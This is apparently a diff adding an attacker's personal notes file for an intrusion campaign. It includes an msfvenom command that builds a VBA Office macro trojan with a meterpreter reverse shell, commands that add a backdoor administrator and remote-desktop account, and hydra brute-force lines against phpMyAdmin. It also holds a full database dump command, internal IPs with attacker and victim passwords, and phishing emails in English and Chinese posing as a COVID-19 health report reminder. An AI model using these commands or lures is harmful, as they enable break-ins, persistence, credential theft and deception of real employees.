@@ -1,0 +1,61 @@
+#make office vba trojan
+sudo msfvenom -p windows/meterpreter/reverse_http  LHOST=my_ip LPORT=443 --platform windows -f vba -o Final.vba
+
+#Add remote work User
+net user /add user10 1qazXDR5 /add
+net localgroup Administrator user10 /add
+net localgroup "Remote Deskop Users" user10 /add
+
+#password crack
+
+hydra.exe -l root -P password.txt -f -e ns -vV  RHOST.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+hydra.exe -l root -P password.txt  RHOST http-post-form ‘/phpmyadmin/index.php:log=USER&pwd=PASS&wp-submit=Log+In:F=Invalid username’
+
+#extrac file(need 7za.exe and 7za.dll)
+7za.exe x [file] -o[output]
+
+#
+http://10.250.100.106/phpmyadmin/index.php?pma_username=root
+
+#send mail
+http://192.168.101.5/mail/
+
+attack user -> emsservice
+attack password -> 1qazXDR%
+
+victim user -> victim
+victim password -> 1qazXDR%
+
+
+#cmd open web page
+start https://xxx.com
+
+#dump DB
+mysqldump -u root -p -A > test.sql
+
+#ph mail text
+Please reward today's health report
+Your health report today has not been filled in, please fill in and reply as soon as possible.
+
+Thank you.
+
+#ph mail chinese text
+請盡快完成Covid-19防疫期的每日健康報告，謝謝！
+
+親愛的吳先生，您好！
+
+
+
+到目前為止，今天的個人健康管理每日記錄還沒有看到您的信息。 請在收到此通知後儘快完成並上傳，以報告您的個人記錄。
+
+那些已經完成報告或今天整天請假的人可以忽略此電子郵件。
+
+
+
+隨著Covid-19流行病繼續蔓延，為了保護電力安全工作夥伴的健康和安全並確保不間斷運行，請注意並配合相關的流行病預防措施。
+
+
+
+要實施防疫措施，請記住戴口罩，經常洗手，保持社交距離，每天保持體溫和照顧好自己。
+
+我想提醒您，一些同事最近沒有在辦公室戴口罩。 為了保護自己和其他工作夥伴，請配合實施。
